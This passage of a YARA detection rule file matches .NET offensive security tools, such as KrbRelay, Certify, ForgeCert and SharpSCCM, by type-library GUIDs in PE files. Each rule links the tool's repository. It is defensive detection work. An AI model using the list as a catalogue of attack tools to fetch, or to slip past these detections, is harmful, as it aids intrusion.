rule SIGNATURE_BASE_HKTL_NET_GUID_Sharphandler : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "b71198a9-4d00-5d75-bc36-7c40655c84a3"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/jfmaes/SharpHandler"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4389-L4403"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3aee0d00306603786fdcf828dc2b1a2faed6c8e651b56eb1985c1b640966da20"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "46e39aed-0cff-47c6-8a63-6826f147d7bd" ascii wide
		$typelibguid1lo = "11dc83c6-8186-4887-b228-9dc4fd281a23" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Driver_Template : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "539f88c5-e779-55e0-98df-299a9068de9b"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/FuzzySecurity/Driver-Template"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4405-L4418"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "6d8e59b58b7d9d15b9bbafd70a2e303e2b275f9a81fc66ea60b1ffd4a4601207"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "bdb79ad6-639f-4dc2-8b8a-cd9107da3d69" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Nashavm : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "3abbf636-01f4-547a-98c0-d7bfec07e31a"
		date = "2021-01-21"
		modified = "2025-08-15"
		reference = "https://github.com/Mrakovic-ORG/NashaVM"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4420-L4433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "b472d072c39e35c476fa9f0fbca8bf0125ca9359f2e6aac7da58f66ea1b11ed6"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "f9e63498-6e92-4afd-8c13-4f63a3d964c3" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpsqlpwn : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "b533d61a-8693-5c3c-8b31-2117262cad4e"
		date = "2022-11-21"
		modified = "2025-08-15"
		reference = "https://github.com/lefayjey/SharpSQLPwn.git"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4435-L4448"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e9210d12c7a8d5973e33aa7bb559ce1c744fd7a810979bec37f95d731c3b50ac"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "c442ea6a-9aa1-4d9c-9c9d-7560a327089c" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Group3R : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "0571d71e-50ca-5c1b-b750-34acc2d06687"
		date = "2022-11-21"
		modified = "2025-08-15"
		reference = "https://github.com/Group3r/Group3r.git"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4450-L4464"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "898569553257991c3776835ec10d5fae697e55bca9c14667ff72c079a095bbf1"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "868a6c76-c903-4a94-96fd-a2c6ba75691c" ascii wide
		$typelibguid1lo = "caa7ab97-f83b-432c-8f9c-c5f1530f59f7" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Tokenstomp : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "e4266969-ab03-50dc-b5b1-f4bb1c9846f4"
		date = "2022-11-21"
		modified = "2025-08-15"
		reference = "https://github.com/MartinIngesen/TokenStomp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4466-L4479"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "931950e70ecfd3e87e535b32bd8af43d70b36670d5e0142e2fb95ed92c85fbd9"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "8aac271f-9b0b-4dc3-8aa6-812bb7a57e7b" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Krbrelay : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "3f59986c-8bd8-5e70-b3eb-038247d1ccd7"
		date = "2022-11-21"
		modified = "2025-08-15"
		reference = "https://github.com/cube0x0/KrbRelay"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4481-L4495"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "b5f8a3f6ba7ba5fa59cdc52337f92256257ec0994ae16fce074d70ad5afa3bc6"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "ed839154-90d8-49db-8cdd-972d1a6b2cfd" ascii wide
		$typelibguid1lo = "3b47eebc-0d33-4e0b-bab5-782d2d3680af" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sqlrecon : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "f9ea5283-0a5c-5bde-966c-80869ee25888"
		date = "2023-01-20"
		modified = "2025-08-15"
		reference = "https://github.com/skahwah/SQLRecon"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4497-L4510"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d1cf5a34a09ed323aeee69080e2f046b613f18294328529a4cca1c49c14da575"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "612c7c82-d501-417a-b8db-73204fdfda06" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Certify : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "69f120fe-bd4d-59ba-b1b9-528ab300e450"
		date = "2023-03-06"
		modified = "2025-08-11"
		reference = "https://github.com/GhostPack/Certify"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4512-L4527"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "da585a8d4985082873cb86204d546d3f53668e034c61e42d247b11e92b5e8fc3"
		logic_hash = "cc31eb8f11f8c48d8c6d34c343c273ac085fdac214ffc7521d26b4a19edd0c4c"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0_v1 = "64524ca5-e4d0-41b3-acc3-3bdbefd40c97" ascii wide
		$typelibguid0_v2 = "15cfadd8-5f6c-424b-81dc-c028312d025f" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Aladdin : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "3f0a954c-f3b3-5e5d-a71d-11f60b026a48"
		date = "2023-03-13"
		modified = "2025-08-15"
		reference = "https://github.com/nettitude/Aladdin"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4529-L4544"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e038ea5b2caed819df725e454ad31ba00b2b1b356875eecd73f2b8a0908c2e33"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "b2b3adb0-1669-4b94-86cb-6dd682ddbea3" ascii wide
		$typelibguid1lo = "c47e4d64-cc7f-490e-8f09-055e009f33ba" ascii wide
		$typelibguid2lo = "32a91b0f-30cd-4c75-be79-ccbd6345de99" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpldaprelayscan : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "554a5487-ac53-512f-8f6f-ad8186144715"
		date = "2023-03-15"
		modified = "2025-08-15"
		reference = "https://github.com/klezVirus/SharpLdapRelayScan"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4546-L4559"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d0b9573ee9893225c5621d02f99f67296193d93a42390125611fe0560bc95fa9"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "a93ee706-a71c-4cc1-bf37-f26c27825b68" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Ldapsigncheck : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "a8b902f0-61a5-509e-8307-79bf557e5f61"
		date = "2023-03-15"
		modified = "2025-08-15"
		reference = "https://github.com/cube0x0/LdapSignCheck"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4561-L4574"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "ffeee319b4161611e3e792aaec2e74c8e368d69c7f5ba9738105f536590099e8"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "21f398a9-bc35-4bd2-b906-866f21409744" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpsccm : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "276269b1-e3b3-5774-a86a-1c3a8bca8209"
		date = "2023-03-15"
		modified = "2025-08-15"
		reference = "https://github.com/Mayyhem/SharpSCCM"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4576-L4590"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "a6650a1a2ad710b85363ea04d66f2467b835bc7bd1097404238f67e07cc3f719"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "03652836-898e-4a9f-b781-b7d86e750f60" ascii wide
		$typelibguid1lo = "e4d9ef39-0fce-4573-978b-abf8df6aec23" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Koh : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "9702526c-b10d-553d-a803-47e352533858"
		date = "2023-03-18"
		modified = "2025-08-15"
		reference = "https://github.com/GhostPack/Koh"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4592-L4605"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "dbb36a1a8f559d10152d14459509408b14f3dc52a685d81f3a3d5e936f5e2a66"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "4d5350c8-7f8c-47cf-8cde-c752018af17e" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Forgecert : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "06b3ffbb-5a76-50a0-86dc-b9658bf2d7ec"
		date = "2023-03-18"
		modified = "2025-08-15"
		reference = "https://github.com/GhostPack/ForgeCert"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4607-L4620"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "4cb79315afc5aae2b35a1d171e8cff34304534a8970b51831568d34135e5c5e6"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "bd346689-8ee6-40b3-858b-4ed94f08d40a" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Crassus : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "d4f94aa3-0431-5ac1-8718-0f0526c3714f"
		date = "2023-03-18"
		modified = "2025-08-15"
		reference = "https://github.com/vu-ls/Crassus"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4622-L4635"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "c6442a8bd4737f0a874c388c74a632bea29c0c8b8c7cc132ad4f145d7a73446b"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "7e9729aa-4cf2-4d0a-8183-7fb7ce7a5b1a" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Restrictedadmin : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "1b3572a5-bb21-58bb-91f9-963a0a17d699"
		date = "2023-03-18"
		modified = "2025-08-15"
		reference = "https://github.com/GhostPack/RestrictedAdmin"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4637-L4650"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "876d0a89429c3e504696a63056b154acacdfa44fddba23298c2432accb71dfd2"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "79f11fc0-abff-4e1f-b07c-5d65653d8952" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_P2P : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid (p2p Remote Desktop is dual use but 100% flagged as malicious on VT)"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "e7b2b4bd-f1e1-5062-9b36-5df44ae374ea"
		date = "2023-03-19"
		modified = "2025-08-15"
		reference = "https://github.com/miroslavpejic85/p2p"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4652-L4665"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "5cdbf5555f4a0dbcbd206708e8678d69ed64f20f734425becd5809396fcfa4b4"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "33456e72-f8e8-4384-88c4-700867df12e2" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpwsus : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "f020eea9-4ff4-5242-b9b2-53284505dab4"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/nettitude/SharpWSUS"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4667-L4680"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e42a5341d03da8b7efedb6bb71b2d908881a7b0df9101e8ad56984a3372915fe"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "42cabb74-1199-40f1-9354-6294bba8d3a4" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpimpersonation : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "5815c5bd-e3e8-5f2f-b03e-8a05fb4f6e91"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/S3cur3Th1sSh1t/SharpImpersonation"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4682-L4695"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "1fd989607bb22f903ad85905ae4fe9f84aa429f75cedd482a318d8cb6c37af19"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "27a85262-8c87-4147-a908-46728ab7fc73" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpcloud : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "048b0239-ea13-58ff-af35-fd505b4c977a"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/chrismaddalena/SharpCloud"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4697-L4710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "b57f9577edcc15aef82f4fb7ceaf33bce73ae5e9d94b33152da49663a9a8f0c9"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "ca4e257e-69c1-45c5-9375-ba7874371892" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpssdp : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "8441e940-ab7c-5467-9db8-35f71bd57580"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/rvrsh3ll/SharpSSDP"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4712-L4725"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3bb849d481b4db321374e084c5bc83fef683fab5f70a429d79d72988f77d8403"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "6e383de4-de89-4247-a41a-79db1dc03aaa" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Wiretap : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "5513a295-8907-5a9c-adca-760b33004229"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/djhohnstein/WireTap"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4727-L4740"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "8dfe01e827fca5b6a2abb847b1615bf71c9d98ea7213b02aa94bb8691d085ac5"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "b5067468-f656-450a-b29c-1c84cfe8dde5" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Kittylitter : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "f457b91f-4adb-5be6-b9c2-f6cc39d4bdaf"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/djhohnstein/KittyLitter"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4742-L4757"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e0cfb39be4d51d2a929712e4f82851b9cafb46643e1403cd4ea8414624a0a2b6"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "449cf269-4798-4268-9a0d-9a17a08869ba" ascii wide
		$typelibguid1lo = "e7a509a4-2d44-4e10-95bf-b86cb7767c2c" ascii wide
		$typelibguid2lo = "b2b8dd4f-eba6-42a1-a53d-9a00fe785d66" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpview : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "2ae1bc26-c137-55ce-ae2e-3204ff07f671"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/tevora-threat/SharpView"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4759-L4772"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "b87f7c5c4d72a5d9d0f493720388f4328dc519677cc8cc218c4f0f95cc970a1e"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "22a156ea-2623-45c7-8e50-e864d9fc44d3" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Farmer : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "f69745b9-4ebd-547a-9af3-bc340b076e5d"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/mdsecactivebreach/Farmer"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4774-L4790"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3e8559dd84fdc698c47acdf19a3f28fe094c96a36d645422f69ad905df5b2263"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "37da2573-d9b5-4fc2-ae11-ccb6130cea9f" ascii wide
		$typelibguid1lo = "49acf861-1c10-49a1-bf26-139a3b3a9227" ascii wide
		$typelibguid2lo = "9a6c028f-423f-4c2c-8db3-b3499139b822" ascii wide
		$typelibguid3lo = "1c896837-e729-46a9-92b9-3bbe7ac2c90d" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Aesshellcodeinjector : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "6253e30b-7c92-5237-a706-e93403a7c0b6"
